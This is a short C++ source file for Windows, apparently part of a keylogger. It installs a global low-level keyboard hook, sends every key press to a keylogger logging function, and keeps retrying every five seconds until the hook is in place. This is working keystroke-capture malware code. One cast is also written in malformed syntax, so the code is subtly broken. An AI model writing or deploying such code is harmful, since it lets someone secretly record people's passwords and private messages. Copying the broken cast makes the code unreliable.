#include "lib/keyboard.h"
#include "lib/keylogger.h"
#include "lib/configuration.h"
#include <thread>
#include <chrono>

using namespace std::chrono_literals;

HHOOK hook;

LRESULT __stdcall hook_callback(int nCode, WPARAM wParam, LPARAM lParam) noexcept
{
		if (nCode >= 0 && wParam == WM_KEYDOWN)
		{
				keylogger::logKeyboard(reinterpret_cast(KBDLLHOOKSTRUCT*)(lParam));
		}

		return CallNextHookEx(hook, nCode, wParam, lParam);
}

void keyboard::setHook()
{
		hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);

		if (!hook)
		{
				std::this_thread::sleep_for(5s);
				setHook();
		}
}
